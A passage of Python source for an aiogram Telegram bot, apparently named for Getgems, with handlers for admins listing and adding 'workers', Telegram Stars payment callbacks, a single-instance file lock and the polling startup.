                    workers = db.get_all_workers() or []
                    workers_count = len(workers)
                    text = f"👷 <b>Воркеры</b>\n\nВсего: <b>{workers_count}</b>\n\n"
                    if not workers:
                        text += "Список воркеров пуст."
                    else:
                        for i, worker in enumerate(workers[:20], 1):
                            username = worker.get('username', 'Нет username')
                            telegram_id = worker.get('telegram_id', 'N/A')
                            first_name = worker.get('first_name', '')
                            text += f"{i}. @{username} ({first_name})\n"
                            text += f"   ID: {telegram_id}\n\n"
                        if len(workers) > 20:
                            text += f"... и еще {len(workers) - 20} воркеров"
                    
                    webapp_url = Config.get_webapp_url() + '/adminpanel'
                    keyboard = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="🌐 Открыть веб-панель", web_app=WebAppInfo(url=webapp_url))],
                    ])
                    await callback.message.edit_text(text, parse_mode="HTML", reply_markup=keyboard)
                else:
                    await callback.answer("❌ Не удалось удалить воркера", show_alert=True)
            except ValueError:
                await callback.answer("❌ Неверный ID воркера", show_alert=True)
        else:
            await callback.answer("❌ Неизвестное действие.")
            
    except Exception as e:
        logger.error(f"Ошибка в admin_callback_handler: {e}", exc_info=True)
        await callback.answer("❌ Произошла ошибка.", show_alert=True)

@dp.pre_checkout_query()
async def pre_checkout_handler(pre_checkout_query: types.PreCheckoutQuery):
    try:
        await bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)
    except Exception as e:
        logger.error(f"answer_pre_checkout_query error: {e}")

@dp.message()
async def admin_add_worker_handler(message: types.Message):
    """Обработчик для добавления воркеров админом через ID, username или пересланное сообщение"""
    try:
        # Обрабатываем только личные сообщения, игнорируем групповые чаты
        if message.chat.type != "private":
            return
        
        # Проверяем, что отправитель - админ
        if not Config.is_admin(message.from_user.id):
            # Если не админ, пропускаем обработку (другие обработчики могут обработать)
            return
        
        # Пропускаем команды и платежи
        if message.text and message.text.startswith('/'):
            return
        if getattr(message, 'successful_payment', None):
            return
        
        target_user = None
        source_type = None
        
        # 1. Проверяем пересланное сообщение
        if message.forward_from:
            target_user = message.forward_from
            source_type = "пересланное сообщение"
        elif message.forward_from_chat and message.forward_from_chat.type == "private":
            # Если переслано из приватного чата
            try:
                target_user = await bot.get_chat(message.forward_from_chat.id)
                source_type = "пересланное сообщение из чата"
            except Exception:
                pass
        
        # 2. Проверяем, является ли текст числовым ID
        if not target_user and message.text:
            text = message.text.strip()
            # Убираем @ если есть
            if text.startswith('@'):
                text = text[1:]
            
            # Проверяем, является ли числом
            try:
                telegram_id = int(text)
                if telegram_id > 0:  # Валидный Telegram ID
                    try:
                        target_user = await bot.get_chat(telegram_id)
                        source_type = "ID"
                    except Exception as e:
                        await message.answer(f"❌ Не удалось найти пользователя с ID {telegram_id}: {str(e)}")
                        return
            except ValueError:
                # Не число, проверяем как username
                if text and not text.startswith('/'):  # Не команда
                    try:
                        target_user = await bot.get_chat(f"@{text}")
                        source_type = "username"
                    except Exception as e:
                        # Пробуем найти в БД
                        user_from_db = db.get_user_by_username(text)
                        if user_from_db:
                            try:
                                target_user = await bot.get_chat(user_from_db['telegram_id'])
                                source_type = "username (из БД)"
                            except Exception:
                                await message.answer(f"❌ Не удалось найти пользователя @{text}")
                                return
                        else:
                            await message.answer(f"❌ Не удалось найти пользователя @{text}")
                            return
        
        # Если пользователь не найден, выходим
        if not target_user:
            return
        
        # Получаем информацию о пользователе через Telegram API
        telegram_id = target_user.id
        user_info = await get_user_info_from_telegram_api(telegram_id)
        
        # Если не удалось получить через API, используем данные из target_user
        if not user_info:
            username = getattr(target_user, 'username', None)
            first_name = getattr(target_user, 'first_name', None)
            last_name = getattr(target_user, 'last_name', None)
            avatar_url = None
        else:
            username = user_info.get('username')
            first_name = user_info.get('first_name')
            last_name = user_info.get('last_name')
            avatar_url = user_info.get('avatar_url')
        
        # Создаем или обновляем пользователя в БД
        user = db.get_or_create_user(
            telegram_id=telegram_id,
            username=username,
            first_name=first_name,
            last_name=last_name or ''
        )
        
        # Обновляем аватар если получили
        if avatar_url:
            db.update_user_avatar(telegram_id, avatar_url)
        
        # Добавляем в воркеры
        was_worker = db.is_worker(telegram_id)
        db.add_worker(telegram_id)
        
        # Формируем информацию о пользователе
        full_name = f"{first_name or ''} {last_name or ''}".strip() or "Без имени"
        username_display = f"@{username}" if username else "Нет username"
        
        # Проверяем, является ли админом
        is_admin = Config.is_admin(telegram_id)
        
        info_text = (
            f"✅ <b>Пользователь добавлен в воркеры</b>\n\n"
            f"📋 <b>Источник:</b> {source_type}\n\n"
            f"👤 <b>Информация:</b>\n"
            f"🆔 <b>ID:</b> <code>{telegram_id}</code>\n"
            f"👤 <b>Имя:</b> {full_name}\n"
            f"📱 <b>Username:</b> {username_display}\n"
        )
        
        if avatar_url:
            info_text += f"🖼️ <b>Аватар:</b> <a href=\"{avatar_url}\">Просмотр</a>\n"
        
        info_text += f"\n{'⚠️ Уже был воркером' if was_worker else '✅ Добавлен как новый воркер'}\n"
        
        if is_admin:
            info_text += f"\n👑 <b>Также является администратором</b>"
        
        # Отправляем информацию
        await message.answer(info_text, parse_mode="HTML")
        
        logger.info(f"Админ {message.from_user.id} добавил воркера {telegram_id} через {source_type}")
        
    except Exception as e:
        logger.error(f"Ошибка в admin_add_worker_handler: {e}", exc_info=True)
        # Не отправляем ошибку, чтобы не мешать другим обработчикам

@dp.message()
async def successful_payment_handler(message: types.Message):
    try:
        # Обрабатываем только личные сообщения, игнорируем групповые чаты
        if message.chat.type != "private":
            return
        
        sp = getattr(message, "successful_payment", None)
        if not sp:
            return
        user_id = message.from_user.id if message.from_user else None
        charge_id = sp.telegram_payment_charge_id
        total_amount = sp.total_amount
        # Опционально: фиксируем платеж и показываем текущий баланс бота
        try:
            balance_obj = await bot.get_my_star_balance()
            balance = getattr(balance_obj, "balance", None)
            await message.answer(
                (
                    "✅ Оплата получена. Баланс пополнен.\n"
                    f"💳 Charge ID: {charge_id}\n"
                    f"⭐ Сумма: {total_amount} XTR\n"
                    f"📊 Текущий баланс звёзд бота: {balance}"
                )
            )
        except Exception as e:
            logger.warning(f"get_my_star_balance error: {e}")
            await message.answer(
                (
                    "✅ Оплата получена. Баланс будет обновлён вскоре.\n"
                    f"💳 Charge ID: {charge_id}\n"
                    f"⭐ Сумма: {total_amount} XTR"
                )
            )
    except Exception as e:
        logger.error(f"successful_payment_handler error: {e}")

# Генерируем уникальный lock файл на основе токена бота
def get_lock_file():
    """Получить путь к lock файлу на основе токена бота"""
    import hashlib
    token_hash = hashlib.md5(Config.BOT_TOKEN.encode()).hexdigest()[:8]
    return f"/tmp/getgems_bot_{token_hash}.lock"

LOCK_FILE = get_lock_file()

def acquire_lock():
    """Получить блокировку для предотвращения множественных запусков одного и того же бота"""
    try:
        lock_fd = os.open(LOCK_FILE, os.O_CREAT | os.O_WRONLY | os.O_TRUNC)
        fcntl.flock(lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        return lock_fd
    except (IOError, OSError) as e:
        logger.error(f"Не удалось получить блокировку. Возможно, бот с этим токеном уже запущен: {e}")
        return None

def release_lock(lock_fd):
    """Освободить блокировку"""
    if lock_fd:
        try:
            fcntl.flock(lock_fd, fcntl.LOCK_UN)
            os.close(lock_fd)
            if os.path.exists(LOCK_FILE):
                os.remove(LOCK_FILE)
        except Exception as e:
            logger.warning(f"Ошибка при освобождении блокировки: {e}")

async def main():
    lock_fd = acquire_lock()
    if not lock_fd:
        logger.error("Бот с этим токеном уже запущен! Остановите другие экземпляры перед запуском.")
        return
    
    try:
        if not Config.validate():
            return
        # На всякий случай удаляем вебхук, чтобы избежать конфликтов getUpdates
        try:
            await bot.delete_webhook(drop_pending_updates=True)
            logger.info("Webhook удалён, включаем polling")
        except Exception as wh_err:
            logger.warning(f"Не удалось удалить webhook: {wh_err}")
        bot_info = await bot.get_me()
        logger.info(f"Бот запущен: @{bot_info.username}")
        
        # Явно указываем типы обновлений, включая инлайн запросы
        from aiogram.enums import UpdateType
        allowed_updates = [
            UpdateType.MESSAGE,
            UpdateType.CALLBACK_QUERY,
            UpdateType.INLINE_QUERY,
            UpdateType.CHOSEN_INLINE_RESULT,
        ]
        
        logger.info(f"Запуск polling с allowed_updates: {allowed_updates}")
        await dp.start_polling(bot, allowed_updates=allowed_updates)
    except Exception as e:
        logger.error(f"Ошибка запуска бота: {e}")
    finally:
        await bot.session.close()
        release_lock(lock_fd)

if __name__ == "__main__":
    asyncio.run(main())
